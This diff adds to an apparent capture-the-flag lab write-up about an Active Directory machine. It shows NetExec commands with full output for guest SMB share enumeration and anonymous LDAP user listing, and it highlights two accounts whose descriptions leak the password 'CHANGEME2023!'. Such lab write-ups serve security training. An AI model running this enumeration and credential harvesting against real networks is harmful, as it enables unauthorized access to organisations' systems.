@@ -196,3 +196,105 @@ Host script results:
 > Domain Name (FQDN): `labyrinth.thm.local`
 > IP Address: `10.130.181.194`
 > Certificate Authority: `thm-LABYRINTH-CA`
+
+## SMB Share enumeration
+
+```shell
+nxc smb ledger.thm -u 'guest' -p '' --shares
+SMB         10.130.181.194  445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                     
+SMB         10.130.181.194  445    LABYRINTH        [+] thm.local\guest: 
+SMB         10.130.181.194  445    LABYRINTH        [*] Enumerated shares
+SMB         10.130.181.194  445    LABYRINTH        Share           Permissions     Remark
+SMB         10.130.181.194  445    LABYRINTH        -----           -----------     ------
+SMB         10.130.181.194  445    LABYRINTH        ADMIN$                          Remote Admin
+SMB         10.130.181.194  445    LABYRINTH        C$                              Default share
+SMB         10.130.181.194  445    LABYRINTH        IPC$            READ            Remote IPC
+SMB         10.130.181.194  445    LABYRINTH        NETLOGON                        Logon server share 
+SMB         10.130.181.194  445    LABYRINTH        SYSVOL                          Logon server share
+```
+
+> Looks like we can only read one share's contents as a guest - IPC$.
+
+```shell
+nxc smb ledger.thm -u 'guest' -p '' --share IPC$ --dir
+SMB         10.130.181.194  445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                     
+SMB         10.130.181.194  445    LABYRINTH        [+] thm.local\guest: 
+SMB         10.130.181.194  445    LABYRINTH        Perms    File Size      Date                          File Path                                    
+SMB         10.130.181.194  445    LABYRINTH        -----    ---------      ----                          ---------                                    
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      InitShutdown                                 
+SMB         10.130.181.194  445    LABYRINTH        fr--     5              Sun Dec 31 19:03:58 1600      lsass                                        
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      ntsvcs                                       
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      scerpc                                       
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-37c-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      epmapper                                     
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-214-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      LSM_API_service                              
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      eventlog                                     
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-404-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      atsvc                                        
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-6c8-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      TermSrv_API_service                          
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      Ctx_WinStation_API_service                   
+SMB         10.130.181.194  445    LABYRINTH        fr--     4              Sun Dec 31 19:03:58 1600      wkssvc                                       
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      SessEnvPublicRpc                             
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-880-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-280-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-280-1         
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      RpcProxy\49670                               
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      47c63ef24d01e88e                             
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      RpcProxy\593                                 
+SMB         10.130.181.194  445    LABYRINTH        fr--     4              Sun Dec 31 19:03:58 1600      srvsvc                                       
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-968-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      spoolss                                      
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-810-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      netdfs                                       
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      W32TIME_ALT                                  
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      Amazon\SSM\InstanceData\health               
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      Amazon\SSM\InstanceData\termination          
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-26c-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-ce4-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     3              Sun Dec 31 19:03:58 1600      cert                                         
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-878-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER       
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      Winsock2\CatalogChangeListener-d08-0         
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      iisipm52436baa-da1f-4de1-a25e-e9a8cd18914a   
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      iislogpipe239a6c86-b96e-4128-a83f-96bd8e97dc16
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      6vkFux0s7nG2b80pxbmSm4Yl1e5MPyj86fAzzW1q71khy7S7gUBoKLtlCcPWgg1w0DCu7Qb6B1euaEwuJ9W1XZrfi5k8xLUd5YqQ3C9iUTzpQ6pf9mhO2X                                                                                                      
+SMB         10.130.181.194  445    LABYRINTH        fr--     1              Sun Dec 31 19:03:58 1600      CPFATP_1856_v4.0.30319
+```
+
+
+> User enumeration with NetExec:
+> Looks like we got two users with leaked credentials in description section. Two users: `SUSANNA_MCKNIGHT` and `IVY_WILLIS` with the password of `CHANGEME2023!`.
+
+```shell
+nxc ldap ledger.thm -u '' -p '' --base-dn "DC=thm,DC=local" --users
+        10.130.181.194  389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local) (signing:None) (channel binding:Never)                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        [+] thm.local\: 
+LDAP        10.130.181.194  389    LABYRINTH        [*] Enumerated 487 domain users: thm.local
+LDAP        10.130.181.194  389    LABYRINTH        -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                                                                                                                                          
+LDAP        10.130.181.194  389    LABYRINTH        Guest                         <never>             0        Tier 1 User                                                                                                                                                                                                            
+LDAP        10.130.181.194  389    LABYRINTH        greg                          2023-05-15 10:49:03 0        Tier 1 User                                                                                                                                                                                                            
+LDAP        10.130.181.194  389    LABYRINTH        SHANA_FITZGERALD              2023-05-30 05:45:58 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        CAREY_FIELDS                  2023-05-30 05:45:58 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        DWAYNE_NGUYEN                 2023-05-30 05:45:58 0        Tier 1 User                                                                                                                                                                                                            
+LDAP        10.130.181.194  389    LABYRINTH        BRANDON_PITTMAN               2023-05-30 05:45:59 0        Tier 1 User                                                                                                                                                                                                            
+LDAP        10.130.181.194  389    LABYRINTH        BRET_DONALDSON                2023-05-30 05:45:59 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        VAUGHN_MARTIN                 2023-05-30 05:45:59 0        Tier 1 User
+LDAP        10.130.181.194  389    LABYRINTH        NATALIE_BRADFORD              2023-05-30 05:46:49 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        FRED_DOTSON                   2023-05-30 05:46:49 0        Tier 1 User                                                                                                                                                                                                            
+LDAP        10.130.181.194  389    LABYRINTH        MORTON_BURNS                  2023-05-30 05:46:49 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        IVY_WILLIS                    2023-05-30 08:30:55 0        Please change it: CHANGEME2023!                                                                                                                                                                                        
+LDAP        10.130.181.194  389    LABYRINTH        SOFIA_PATTERSON               2023-05-30 05:46:49 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        JANE_FOLEY                    2023-05-30 05:46:49 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        PEARL_FULLER                  2023-05-30 05:46:49 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        GUADALUPE_TURNER              2023-05-30 05:46:50 0        Tier 1 User                                                                                                                                                                                                            
+LDAP        10.130.181.194  389    LABYRINTH        VIVIAN_HARPER                 2023-05-30 05:46:50 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        VICENTE_BURT                  2023-05-30 05:46:50 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        DIXIE_BERGER                  2023-05-30 05:46:50 0                                                                                                                                                                                                                               
+LDAP        10.130.181.194  389    LABYRINTH        LIZ_WALTER                    2023-05-30 05:46:50 0        Tier 1 User                                                                                                                                                                                                            
+LDAP        10.130.181.194  389    LABYRINTH        SUSANNA_MCKNIGHT              2023-07-05 11:11:32 0        Please change it: CHANGEME2023!                                                                                                                                                                                        
+LDAP        10.130.181.194  389    LABYRINTH        LILY_LYONS                    2023-05-30 05:46:50 0        Tier 1 User                                                                                                                                                                                                            
+LDAP        10.130.181.194  389    LABYRINTH        WALDO_BOYER                   2023-05-30 05:46:51 0                                                                                                                                                                                                                                 
+```
+
